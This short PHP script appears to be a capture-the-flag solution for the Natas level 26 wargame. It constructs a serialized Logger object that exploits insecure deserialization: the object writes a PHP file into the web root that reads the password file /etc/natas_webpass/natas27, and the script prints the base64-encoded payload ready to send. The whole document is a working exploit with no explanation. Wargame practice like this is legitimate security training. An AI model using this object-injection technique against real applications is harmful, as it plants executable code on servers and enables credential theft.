<?php

	class Logger{
	    private $logFile;
	    private $initMsg;
	    private $exitMsg;
	  
	    function __construct(){
	        // initialise variables
	        $this->initMsg="you are being h4ck3d\n";
	        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
	        $this->logFile = "/var/www/natas/natas26/img/natas27_pwd.php";
	    }
	}	

	$o = new Logger();

	print base64_encode(serialize($o))."\n";

?>